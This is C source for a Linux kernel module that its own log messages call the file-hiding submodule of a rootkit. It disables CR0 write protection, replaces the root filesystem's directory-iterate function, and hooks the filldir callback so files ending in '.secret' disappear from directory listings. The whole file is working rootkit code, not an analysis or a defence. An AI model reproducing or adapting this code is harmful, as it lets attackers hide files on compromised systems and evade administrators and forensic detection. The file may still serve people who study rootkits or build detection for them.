#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/dirent.h>

# define SECRET_FILENAME_SUFFIX ".secret"
# define printk_info(fmt, ...) printk(KERN_INFO "%s.%s\t: " fmt, THIS_MODULE->name, __func__, ##__VA_ARGS__)


int (*real_iterate)(struct file *filp, struct dir_context *ctx);

int (*real_filldir)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);

// 检查文件后缀
bool check_file_suffix(const char *name)
{
    int len = strlen(name);
    int suffix_len = strlen(SECRET_FILENAME_SUFFIX);
    if (len >= suffix_len)
    {
        const char *check_suffix = name;
        check_suffix += len - suffix_len;
        return strcmp(check_suffix, SECRET_FILENAME_SUFFIX) == 0;
    }
    return false;
}

// 关闭写保护
void disable_wp(void) {
    unsigned long cr0;

    preempt_disable();
    cr0 = read_cr0();
    clear_bit(X86_CR0_WP_BIT, &cr0);
    write_cr0(cr0);
    preempt_enable();
}

// 打开写保护
void enable_wp(void) {
    unsigned long cr0;

    preempt_disable();
    cr0 = read_cr0();
    set_bit(X86_CR0_WP_BIT, &cr0);
    write_cr0(cr0);
    preempt_enable();
}

// 替换整个文件系统下的file_operations->iterate函数
#define set_file_op(new_iterate, old_iterate) \
    {\
        struct file *filp;\
        struct file_operations *f_op;\
        filp = filp_open("/", O_RDONLY, 0);\
        if (IS_ERR(filp)) {\
            printk_info("Failed to open / with error %ld.\n", PTR_ERR(filp));\
            old_iterate = NULL;\
        } else {\
            f_op = (struct file_operations *)filp->f_op;\
            old_iterate = f_op->iterate;\
            printk_info("Changing file_op->iterate from %p to %p.\n", old_iterate, new_iterate);\
            disable_wp();\
            f_op->iterate = new_iterate;\
            enable_wp();\
        }\
    }


int fake_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type) {
    if (check_file_suffix(name)) {
        printk_info("Hiding: %s\n", name);
        return 0;
    }
    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}

int fake_iterate(struct file *filp, struct dir_context *ctx) {
    real_filldir = ctx->actor;
    *(filldir_t *) &ctx->actor = fake_filldir;
    return real_iterate(filp, ctx);
}


static int __init init_file_hide(void) {
    printk_info("----------The submodule FILE-HIDE of rootkit has been installed----------\n");
    set_file_op(fake_iterate, real_iterate);
    if (!real_iterate) {
        return -ENOENT;
    }
    return 0;
}


static void __exit exit_file_hide(void) {
    if (real_iterate) {
        int (* dummy)(struct file *, struct dir_context *);
        set_file_op(real_iterate, dummy);
    }
    printk_info("----------The submodule FILE-HIDE of rootkit has been removed------------\n");
}

module_init(init_file_hide);
module_exit(exit_file_hide);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("chenwengang");
